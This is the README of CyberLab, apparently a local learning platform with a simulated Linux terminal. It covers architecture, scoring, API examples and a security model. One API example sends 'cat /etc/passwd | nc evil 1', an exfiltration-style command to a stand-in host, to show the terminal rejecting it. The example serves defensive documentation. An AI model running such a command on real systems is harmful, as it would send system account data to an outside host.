# CyberLab — Interactive Cybersecurity Learning Platform

*Learn Cybersecurity by Doing.*

CyberLab is a beginner-friendly web application for practising cybersecurity. Learners work through short,
realistic scenarios: they investigate in a **simulated** Linux terminal, reveal progressive hints when stuck,
submit an answer that the server checks and scores, and then read a full explanation of the solution. Progress,
points and activity are stored in SQLite and shown on a dashboard.

> **Status:** MVP complete (development Phases 1–10). 7 modules, 14 challenges, 128 backend tests, 33
> frontend component tests and 62 end-to-end browser tests passing. The design and phase plan are in
> [docs/PLAN.md](docs/PLAN.md).

---

## Contents

1. [Features](#features)
2. [Quick start](#quick-start-windows-powershell)
3. [Architecture](#architecture)
4. [Technology stack](#technology-stack)
5. [Folder structure](#folder-structure)
6. [Course content and challenge design](#course-content-and-challenge-design)
7. [The simulated terminal](#the-simulated-terminal)
8. [Hints, scoring and progress](#hints-scoring-and-progress)
9. [Database](#database)
10. [API reference](#api-reference)
11. [Security](#security)
12. [Testing](#testing)
13. [Known limitations](#known-limitations)

---

## Features

| Feature | What the learner gets |
|---|---|
| **Dashboard** | Total, completed and pending challenges, points out of 1,900, completion %, progress per module, recent activity, and a recommended next challenge. Every number comes from the database; empty states are labelled, never faked. |
| **Learning modules** | 7 modules, each with an introduction, key concepts, learning objectives, difficulty, completion status and its challenges. |
| **Challenges** | Scenario, objective, step-by-step instructions, concept notes, multiple-choice or typed answers, instant feedback, and an explanation unlocked after solving (solution, why it is correct, concept, commands used, common mistakes, real-world relevance). |
| **Simulated terminal** | A Linux-style terminal in the browser for 9 challenges: prompt with current folder, command history (↑/↓), `clear` / Ctrl+L. Commands run in a read-only, in-memory simulation on the server; nothing runs on a real computer. |
| **Progressive hints** | Three hints per challenge, revealed one at a time after the cost is shown and confirmed. |
| **Server-side scoring** | 100 / 200 / 300 points by difficulty, minus 10% per hint used; awarded exactly once; never accepted from the browser. |
| **Progress tracking** | Progress page with totals, module completion times, every challenge's attempts / hints / points / completion time, and the full activity history. |
| **Reset** | Delete all progress (after typing RESET) to start the course again, e.g. before a demonstration. |
| **Friendly, accessible, responsive UI** | A bright learning theme with a dark mode (Light / Dark / System toggle in the header), a colour and icon per module, an encouraging dashboard and step-by-step challenge pages. Works from 320 px phones to desktops; keyboard usable; WCAG 2.1 A/AA checks pass with axe-core in both themes. |

## Quick start (Windows PowerShell)

Requirements: **Node.js 22.12 or newer** (developed with Node.js 24.18.0 and npm 11.16.0). No database server
is needed.

```powershell
# 1. Install dependencies (once)
cd backend;  npm install;  cd ..
cd frontend; npm install;  cd ..

# 2. Terminal 1 - API on http://127.0.0.1:4000
cd backend
npm run dev

# 3. Terminal 2 - web app on http://127.0.0.1:5173
cd frontend
npm run dev
```

Open **http://127.0.0.1:5173**. The header should show **Server online** and the dashboard should list 14
challenges in 7 modules. The database file `backend/data/cyberlab.sqlite` is created and filled with the course
content on the first start.

### Configuration (optional)

Copy `backend/.env.example` to `backend/.env` to change the defaults:

| Variable | Default | Meaning |
|---|---|---|
| `PORT` | `4000` | API port |
| `HOST` | `127.0.0.1` | Address the API binds to. Anything other than a loopback address prints a warning: CyberLab has no login. |
| `DATABASE_PATH` | `data/cyberlab.sqlite` | SQLite file (relative to `backend/`); `:memory:` for a throwaway database |
| `ALLOWED_HOSTS` | *(empty)* | Extra host names the API answers to (localhost, 127.0.0.1 and [::1] are always allowed) |

The frontend's dev server forwards `/api/*` to `http://127.0.0.1:4000`; set `CYBERLAB_API_URL` before
`npm run dev` to point it elsewhere.

### Production-like run

```powershell
cd backend;  npm run build;  npm start          # compiled API (dist/) on port 4000
cd frontend; npm run build;  npx vite preview   # built web app on http://127.0.0.1:4173, /api forwarded to 4000
```

`vite preview` reuses the same `/api` forwarding as the dev server. The backend serves only the API; it does not
serve the built frontend.

### Scripts

| Folder | Command | What it does |
|---|---|---|
| backend | `npm run dev` | API with auto-reload |
| backend | `npm test` | Backend tests (Vitest + supertest) |
| backend | `npm run typecheck` | Type-check source and tests |
| backend | `npm run build` / `npm start` | Compile to `dist/` / run the compiled API |
| frontend | `npm run dev` | Vite dev server |
| frontend | `npm run build` | Type-check app, configs and tests, then build to `dist/` |
| frontend | `npm run lint` | Lint with oxlint |
| frontend | `npm test` | Component tests (Vitest + Testing Library) |
| frontend | `npm run test:e2e` | End-to-end and accessibility tests (Playwright, starts its own servers) |

## Architecture

CyberLab is a small **monolith**: one React single-page app and one Express API with an SQLite file. No external
services, queues or caches are needed.

```
 Browser (React SPA)                     Vite dev server              Express API (Node.js)                    SQLite file
 ┌──────────────────────┐  /api/* JSON   ┌──────────────┐  proxy     ┌──────────────────────────────────┐    ┌─────────────────────┐
 │ pages + components   │ ─────────────▶ │ :5173        │ ─────────▶ │ security middleware              │    │ modules, challenges │
 │ api/client.ts (fetch)│ ◀───────────── │              │ ◀───────── │ routes -> controllers (zod)      │ ─▶ │ challenge_hints     │
 └──────────────────────┘                └──────────────┘            │ services (scoring, hints, ...)   │    │ challenge_progress  │
                                                                     │ repositories (SQL)               │    │ activity_log, users │
                                                                     │ terminal engine (pure, in-memory)│    └─────────────────────┘
                                                                     └──────────────────────────────────┘
```

**Request pipeline** (`backend/src/app.ts`): security headers → Host-header check → POSTs must be JSON → JSON body
parser (10 KB limit) → route → controller validates input with zod → service applies business rules →
repository runs parameterised SQL → JSON response. Errors from any step go to one error handler that returns
`{ "error": { "code", "message" } }`.

**Backend layers**

| Layer | Folder | Responsibility |
|---|---|---|
| Routes | `src/routes/` | Map URL + method to a controller; 405 for wrong methods |
| Controllers | `src/controllers/` | Validate parameters and bodies (zod), call a service, send JSON |
| Services | `src/services/` | Business rules: scoring, hints, answer checking, dashboard, progress, terminal |
| Repositories | `src/repositories/` | All SQL, parameterised |
| Terminal engine | `src/terminal/` | Tokenizer, virtual filesystem, command handlers; no I/O at all |
| Content | `src/content/` | Modules, challenges, hints, simulated environments (TypeScript, version-controlled) |

**Frontend**: React Router pages (`src/pages/`) load data with a small `useApi` hook (loading / success / error
states) and render shared components (`src/components/`). Every request goes through `src/api/client.ts`, which
turns failures into readable messages. The challenge page keeps the challenge in state and replaces it with the
refreshed copy returned by hint and answer requests, so the terminal session survives.

**Visual design**: a bright, beginner-friendly theme with a matching dark mode. Colour tokens live in `src/index.css`; indigo is the single
accent for actions, and status colours mean the same thing everywhere (green = completed, amber = hints and
points, red = danger). Each module has its own icon and colour (`src/utils/moduleTheme.ts`). The terminal is
deliberately dark, like a real one.

**Dark mode**: components use colour *roles* (`surface`, `ink`, `muted`, `accent`, `success-soft`, ...) rather
than raw palette names. `src/index.css` defines every role twice, once for light and once under the `.dark` class
on `<html>`, so switching theme only swaps token values. The header toggle offers Light, Dark and System (the
default, which follows the operating system and reacts when it changes). The choice is stored in the browser's
`localStorage` under `cyberlab-theme` (`src/utils/theme.ts`, `src/hooks/useTheme.ts`); a small inline script in
`index.html` applies it before the first paint, so there is no white flash. If storage is blocked or holds an
unknown value, the app falls back to System.

Shared building blocks: `Card`, `StatCard`, `ModuleIcon`, badges and button
styles in `src/utils/styles.ts`.

**Key design decisions**

- **One local learner profile, no accounts.** CyberLab runs on the learner's own computer; login would double the
  project without teaching security. Every progress table still has a `user_id`, so accounts can be added later.
- **The terminal runs on the server.** Challenge files and answers are never sent to the browser in bulk, and the
  simulation stays pure and testable.
- **Content lives in code, progress lives in SQLite.** Content files are reviewed and tested like code and copied
  into the database at every start; progress rows are never touched by that copy.

## Technology stack

| Layer | Package | Version | Why it is used |
|---|---|---|---|
| Frontend | react, react-dom | 19.3.1 | Component-based UI |
| Frontend | typescript | 7.0.2 | Static types in both apps; catches API mismatches at build time |
| Frontend | vite, @vitejs/plugin-react | 8.3.8, 6.3.0 | Dev server with `/api` proxy, production bundler |
| Frontend | tailwindcss, @tailwindcss/vite | 4.3.5 | Utility-first styling |
| Frontend | react-router-dom | 7.18.5 | Real URLs such as `/challenges/linux-hidden-files` |
| Frontend | lucide-react | 1.73.0 | SVG icons |
| Backend | express | 5.3.0 | HTTP routing and middleware |
| Backend | better-sqlite3 | 13.2.0 | SQLite driver (bundles SQLite 3.54.1); synchronous API keeps code simple |
| Backend | zod | 4.6.7 | Declarative validation of every parameter and request body |
| Dev | tsx | 4.23.15 | Runs the TypeScript backend directly with auto-reload |
| Dev | vitest | 5.1.0 | Test runner for both apps |
| Dev | supertest | 7.3.2 | HTTP tests against the Express app in-process |
| Dev | @testing-library/react, user-event, jest-dom; jsdom | 16.3.3, 14.6.11, 7.0.1; 31.0.1 | Component tests in a simulated DOM |
| Dev | @playwright/test | 1.65.1 | End-to-end tests in a real browser |
| Dev | @axe-core/playwright | 4.14.0 | Automated WCAG accessibility checks |
| Dev | oxlint | 1.93.0 | Linting |

Deliberately **not** used: an ORM, Redis or queues, CORS middleware (the API is same-origin through the proxy and
must never grant cross-origin access), `helmet` (six headers are set by hand in `middleware/security.ts`) and
`dotenv` (Node.js loads `.env` with `--env-file-if-exists`).

## Folder structure

```
CyberLab/
├── README.md
├── docs/PLAN.md                    plan, requirements, design decisions and phase history
├── backend/
│   ├── .env.example                optional settings
│   ├── src/
│   │   ├── index.ts                starts the server (config -> database -> seed -> listen)
│   │   ├── app.ts                  builds the Express app and its middleware pipeline
│   │   ├── config.ts               environment variables with safe defaults
│   │   ├── errors.ts               AppError (status + code + safe message)
│   │   ├── content/                modules.ts, challenges/*.ts, environments.ts, types.ts
│   │   ├── db/                     connection.ts (pragmas, schema), schema.ts, seed.ts
│   │   ├── middleware/             security.ts (headers, host check, JSON-only, 405), errorHandler.ts
│   │   ├── routes/                 health.ts, index.ts (all API routes)
│   │   ├── controllers/            dashboard, content (modules, challenges, hints, submit), terminal, progress
│   │   ├── services/               scoring, answerChecker, challengeAction, challenge, module, dashboard, progress, terminal
│   │   ├── repositories/           contentRepository.ts, progressRepository.ts
│   │   ├── terminal/               tokenizer.ts, filesystem.ts, commands.ts, engine.ts
│   │   └── validation/             zod schemas (params, challenge, terminal, progress)
│   └── tests/                      128 tests (one file per area)
└── frontend/
    ├── vite.config.ts              dev server, /api proxy, Tailwind
    ├── vitest.config.ts            component test setup (jsdom)
    ├── playwright.config.ts        e2e setup: starts its own API and web servers
    ├── e2e/                        learner journey, responsive layout, accessibility
    └── src/
        ├── main.tsx, router.tsx    entry point and routes
        ├── api/                    client.ts (fetch + errors), endpoints.ts, types.ts
        ├── hooks/                  useApi.ts, useDocumentTitle.ts, useTheme.ts
        ├── components/             layout (header, theme toggle), ui (badges, states, cards), content (lists, reset), challenge (terminal, hints, answer, explanation)
        ├── pages/                  Dashboard, Modules, ModuleDetail, Challenges, Challenge, Progress, NotFound
        ├── utils/                  formatting, terminal path and theme helpers, styles
        └── test/                   test setup, helpers, source security scan
```

## Course content and challenge design

| Module | Difficulty | Challenges |
|---|---|---|
| Cybersecurity Fundamentals | beginner | The CIA Triad in Practice · Least Privilege |
| Linux & Command-Line Basics | beginner | Find the Onboarding Note · Hidden Files |
| Networking Fundamentals | beginner | Find the Default Gateway · Which Server Is Down? |
| Password Security | beginner | Choose the Strongest Password · Audit Admin Accounts for MFA |
| Cryptography Basics | beginner | Encoding Is Not Encryption · Break a Caesar Cipher |
| Phishing Awareness | beginner | Who Really Owns This Link? · Read the Email Headers |
| Digital Forensics Basics | intermediate | Investigate a Brute-Force Attack · Find What the Attacker Left Behind |

9 beginner challenges (100 points) and 5 intermediate challenges (200 points): **1,900 points** in total.
9 challenges use the terminal; 3 are multiple choice.

### How a challenge is defined

Each challenge is a TypeScript object in `backend/src/content/challenges/<module>.ts`:

| Field | Purpose | Sent to the browser? |
|---|---|---|
| `scenario`, `objective`, `instructions`, `resources` | The story, the goal, steps and concept notes | Yes |
| `answer` | `{ type: 'text', accepted: [...] }` or `{ type: 'choice', options, correct }` | Options only, never the correct answer |
| `terminalEnv` | Id of a simulated environment in `environments.ts` | Environment name, user and host only |
| `hints` | Exactly three: a nudge, a direction, a strong clue | Only those already revealed |
| `explanation` | Solution, why, concept, commands, common mistakes, real-world relevance | Only after completion |

**Adding a challenge:** add the object to a module file (and, if needed, files to an environment), restart the
backend, and run `npm test`. The content tests check ids, references, three hints, complete explanations, valid
answer rules, that every terminal answer can be found in its environment, and that the commands listed in the
explanation actually reveal the answer.

## The simulated terminal

The terminal looks like a Linux shell but is a **simulation**: a small TypeScript program that reads fictional
files stored as JavaScript objects. It never starts a process, reads the real disk or opens a network connection.

```
POST /api/terminal/execute { challengeId, command, cwd, history }
  -> validation   ≤ 200 characters, printable only, ≤ 50 history entries, no extra fields
  -> tokenizer    words and quotes; ; & | < > ` $( ) and $VAR rejected with an explanation
  -> engine       command name looked up in this environment's allowlist (a Map)
  -> handler      pure function reading the frozen in-memory filesystem / simulated network data
  <- { output, cwd, clear, isError }
```

The server keeps no terminal state: the browser sends the current folder and recent history with each command,
and the server re-validates the folder (an invalid one falls back to the home folder).

| Commands | Available in |
|---|---|
| `help`, `clear`, `history`, `pwd`, `whoami`, `echo`, `ls [-a] [-l]`, `cd`, `cat` | every terminal challenge |
| `grep [-i] [-c] [-n] [-v] PATTERN FILE...` (plain text, not regular expressions) | password audit, phishing mailbox, forensics |
| `find [PATH] [-name PATTERN] [-type f\|d]` | forensics |
| `ipconfig`, `ping [-c N] HOST` (predefined output; no packets are sent) | networking |
| `base64 [-d] FILE` | cryptography |

Commands that are deliberately missing get an explanation instead of a bare error, for example
`rm: The simulated filesystem is read-only…` or `curl: … this simulated terminal never sends network traffic.`

### Terminal security model

| Threat | Protection |
|---|---|
| Running real commands | No `child_process`, `exec`, `spawn`, `eval`, `Function` or `vm` anywhere in the backend; a test scans the source |
| Reading host files | The engine imports no filesystem module; paths resolve only inside the in-memory tree; `..` stops at the simulated `/` |
| Changing files | Environments are deep-frozen; no command writes; tests prove hostile commands leave them unchanged |
| Shell tricks | Chaining, pipes, redirection, command substitution and variables are rejected before any command runs |
| Leaking secrets | Variables are rejected; a test sets a canary environment variable and checks that no command prints it or host paths |
| JavaScript prototype tricks | Commands are looked up in a `Map`, files with `Object.hasOwn`, so `constructor` or `__proto__` are ordinary unknown names |
| Denial of service | ≤ 200 characters, ≤ 20 arguments, ≤ 400 output lines; plain-text `grep` and a linear-time wildcard matcher for `find` (no regular-expression backtracking) |

## Hints, scoring and progress

```
points awarded = base - hints used x 10% of base         base = 100 beginner | 200 intermediate | 300 advanced
```

| Situation | What happens |
|---|---|
| Hint revealed before solving | Costs 10% of the base; the page states the cost and asks for confirmation |
| Same hint requested again (double click, retry) | Ignored: the request names the hint number, so a repeat changes nothing |
| Hint requested out of order | Refused (HTTP 409) |
| Wrong answer | No points lost; the attempt is counted and logged |
| Correct answer | Points computed from the hints actually used; explanation and all hints unlocked |
| Submitting again after completion | Reported as already completed; nothing changes |
| Browser sends points or a status | Rejected: request bodies are strict and accept only `hintNumber` or `answer` |

Typed answers are compared after normalisation (letter case, surrounding and repeated spaces and wrapping
quotes are ignored), so `"tux-4821"` matches `TUX-4821`. Each hint reveal and submission runs in one SQLite
transaction, and the updates carry guard conditions (`WHERE status = 'in_progress'`, `WHERE hints_used = ?`), so
even simultaneous requests cannot award points twice.

**Progress and reset.** A challenge is *not started* (no row), *in progress* (a hint or attempt was recorded) or
*completed*. `POST /api/progress/reset` with `{ "confirm": "RESET" }` deletes the learner's progress and activity
in one transaction; course content is not touched. The Progress page enables its reset button only after RESET is
typed.

## Database

SQLite file with foreign keys, CHECK constraints, indexes and WAL journal mode (schema version 1,
`backend/src/db/schema.ts`):

| Table | Contents | Key constraints |
|---|---|---|
| `users` | the single local learner (id 1) | primary key `id` |
| `modules` | module text, objectives (JSON), difficulty, order | `difficulty` CHECK; unique order |
| `challenges` | challenge text, answer rule (JSON, server-only), explanation (JSON), terminal environment | FK `module_id` → `modules` (cascade); unique order per module |
| `challenge_hints` | three hints per challenge | PK (`challenge_id`, `hint_number`); `hint_number` 1–3 |
| `challenge_progress` | status, attempts, hints used, points, start and completion time | PK (`user_id`, `challenge_id`); `hints_used` 0–3; completed ⇔ `completed_at` set |
| `activity_log` | hint reveals, wrong attempts, completions | FKs; index on (`user_id`, `created_at`) |

Content tables are rewritten from `src/content/` at every start inside one transaction (upsert, so progress that
refers to them is kept). Content removed from the files is deleted together with its hints and progress.

## API reference

All endpoints return JSON. Errors always look like `{ "error": { "code": "...", "message": "..." } }`
(validation errors add `details` with the failing field, never the submitted value). POST bodies must be sent with
`Content-Type: application/json`.

| Method | Path | Purpose | Success | Errors |
|---|---|---|---|---|
| GET | `/api/health` | API and database status | 200 | 503 if the database is unavailable |
| GET | `/api/dashboard` | Totals, module progress, recent activity, recommendation | 200 | — |
| GET | `/api/modules` | Modules with progress | 200 | — |
| GET | `/api/modules/:moduleId` | Module detail with its challenges | 200 | 400, 404 |
| GET | `/api/challenges` | All challenges with status | 200 | — |
| GET | `/api/challenges/:challengeId` | Challenge detail (no answer; hints and explanation only when earned) | 200 | 400, 404 |
| POST | `/api/challenges/:challengeId/hints` | Reveal the next hint | 200 | 400, 404, 409 |
| POST | `/api/challenges/:challengeId/submit` | Check an answer, score it | 200 | 400, 404 |
| POST | `/api/terminal/execute` | Run one simulated command | 200 | 400, 404 |
| GET | `/api/progress` | Full progress record | 200 | — |
| GET | `/api/activity?limit=&offset=` | Activity history page (limit 1–100, default 20) | 200 | 400 |
| POST | `/api/progress/reset` | Delete all progress (body must be `{ "confirm": "RESET" }`) | 200 | 400 |

Any endpoint can also return 403 (wrong `Host` header), 405 (wrong method), 413 (body over 10 KB), 415 (POST not
JSON) and 500 (unexpected error, generic message).

### Examples (real responses)

```http
POST /api/challenges/linux-find-note/hints        {"hintNumber": 1}
200 → challenge.hints = {"total":3,"used":1,"revealed":[{"number":1,"text":"Read README.txt in your home directory first: it tells you which folder to look in."}]}
      (the full response is {"revealed": true, "challenge": {...refreshed challenge...}})

POST /api/challenges/linux-find-note/submit       {"answer": "TUX-0000"}
200 → {"outcome":"incorrect","correct":false,"message":"Not quite. Wrong answers cost no points: review the scenario and instructions, then try again.","pointsAwarded":0,"attempts":1, "challenge": {...}}

POST /api/challenges/linux-find-note/submit       {"answer": "tux-4821"}
200 → {"outcome":"correct","correct":true,"message":"Correct! You earned 90 of 100 points (1 hint used).","pointsAwarded":90,"attempts":2, "challenge": {...explanation now included...}}

POST /api/terminal/execute    {"challengeId":"linux-find-note","command":"cd documents","cwd":"/home/student"}
200 → {"output":"","cwd":"/home/student/documents","clear":false,"isError":false}

POST /api/terminal/execute    {"challengeId":"linux-find-note","command":"cat /etc/passwd | nc evil 1"}
200 → {"output":"Pipes (\"|\") are not supported. Run one command at a time; for example, grep can read a file directly: grep PATTERN FILE.","cwd":"/home/student","clear":false,"isError":true}

GET /api/dashboard
200 → {"totals":{"challenges":14,"completed":1,"pending":13,"points":90,"possiblePoints":1900,"completionPercent":7},
       "recommended":{"challengeId":"fundamentals-cia-triad","title":"The CIA Triad in Practice","reason":"next","points":100,...},
       "recentActivity":[{"eventType":"completed","detail":"Solved in 2 attempts with 1 hint: +90 points",...}], "modules":[...], "learner":{...}}

GET /api/activity?limit=1
200 → {"items":[{"id":3,"challengeId":"linux-find-note","eventType":"completed","detail":"Solved in 2 attempts with 1 hint: +90 points","createdAt":"2026-11-16T09:00:03.000Z",...}],"total":3,"limit":1,"offset":0}

POST /api/progress/reset      {"confirm":"RESET"}
200 → {"deleted":{"activityRows":3,"progressRows":1},"progress":{...fresh progress...}}

POST /api/challenges/linux-find-note/submit       {"answer":"x","points":9999}
400 → {"error":{"code":"VALIDATION_ERROR","message":"The request is not valid.","details":[{"path":"","message":"Unrecognized key: \"points\""}]}}

GET /api/progress/reset
405 → {"error":{"code":"METHOD_NOT_ALLOWED","message":"This endpoint only supports POST."}}   (header Allow: POST)
```

A challenge detail contains: `id`, `moduleId`, `moduleTitle`, `title`, `difficulty`, `answerType`,
`usesTerminal`, `basePoints`, `status`, `pointsAwarded`, `scenario`, `objective`, `instructions`, `resources`,
`options` (multiple choice only), `terminal`, `scoring` (`basePoints`, `hintPenaltyPercent`, `pointsAvailable`),
`hints` (`total`, `used`, `revealed`), `progress`, `explanation` (null until completed) and `navigation`.

## Security

Besides the terminal security model above, every endpoint is protected as follows (`backend/src/middleware/`):

| Threat | Protection |
|---|---|
| Cross-site request forgery (another website making your browser reset progress) | POSTs must be `application/json` (otherwise 415). HTML forms cannot send JSON, and a cross-site JSON request needs a CORS preflight, which the API never approves (it sends no CORS headers). |
| DNS rebinding (a malicious site pointing its own domain at 127.0.0.1) | Requests whose `Host` header is not `localhost`, `127.0.0.1` or `[::1]` (plus `ALLOWED_HOSTS`) are refused with 403 |
| Content sniffing, framing, caching personal data | `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`, `Referrer-Policy: no-referrer`, `Cross-Origin-Resource-Policy: same-origin`, `Cache-Control: no-store` |
| Malformed or hostile input | zod schemas everywhere; strict objects reject unknown fields such as `points` or `__proto__`; 10 KB body limit |
| SQL injection | Parameterised queries only |
| Information leaks | Generic 500 messages; validation errors never echo submitted values |
| Network exposure | Binds to 127.0.0.1 by default; warns if started on another address |
| Answer leakage | Answer rules, unrevealed hints and unfinished explanations are never sent to the browser (tested for all 14 challenges) |
| Unsafe rendering | React renders all content as text; a frontend test fails if `dangerouslySetInnerHTML`, `innerHTML`, `eval` or similar appear |
| Vulnerable dependencies | `npm audit`: 0 known vulnerabilities in both apps (16 November 2026) |

## Testing

| Suite | Command | Result | Covers |
|---|---|---|---|
| Backend | `cd backend; npm test` | 128 passing | Every endpoint, validation, scoring, hints, submissions, progress, reset, persistence across restarts, seeding, content solvability, terminal engine, hostile terminal input, HTTP security (headers, CSRF, DNS rebinding, methods, injection, errors) |
| Frontend components | `cd frontend; npm test` | 33 passing | Terminal (exact requests, prompt, history keys, clear, errors, output rendered as text), theme toggle (system default, saved choice, OS changes, blocked storage), hint confirmation, answer feedback, reset confirmation, API client errors, source security scan |
| End-to-end | `cd frontend; npm run test:e2e` | 62 passing, 6 skipped | Full learner journey; every page on desktop and a 390 px phone without horizontal scrolling or console errors; 404 pages; WCAG 2.1 A/AA checks with axe-core in the light **and** dark theme (including hint, feedback, explanation and reset states); theme toggle persists across reloads; keyboard-only use; page titles and focus after navigation |

The end-to-end suite starts its own API and web servers on ports 4100 and 5174 with an **in-memory database**, so
it never touches your data or a running `npm run dev`. It uses the installed Microsoft Edge; set
`PLAYWRIGHT_CHANNEL=chrome` to use Chrome. The 6 skipped tests are the journey and keyboard tests on the phone
viewport (they run once, on desktop).

## Known limitations

- **One shared learner profile, no login.** Everyone using the same running copy shares one progress record. It is
  designed for one person on their own computer, not for a shared server.
- **No rate limiting** and no production deployment setup (HTTPS, process manager, serving the built frontend from
  the backend).
- **Wrong answers are free**, so multiple-choice questions can be solved by guessing. This keeps the platform
  encouraging; the explanation afterwards is where the learning happens.
- **The terminal is intentionally limited:** 14 commands, no pipes, redirection, variables or tab completion;
  `grep` matches plain text only; the filesystem is read-only; the session is not kept when you leave the page.
  `ipconfig` follows Windows output style inside an otherwise Linux-like shell (the challenge's resources and the
  message shown for `ifconfig` / `ip` name the Linux equivalent, `ip addr`).
- **Typed answers must match an accepted form** after normalisation; equivalent answers that are not listed are
  marked wrong.
- **Content changes need a backend restart** (content is copied into the database at start-up), and removing a
  challenge from the content files also deletes its progress.
- **Scope:** 14 challenges in English; no Web Security module yet.
- **Accessibility** is verified with automated WCAG checks and keyboard tests; it has not been tested manually with
  a screen reader.
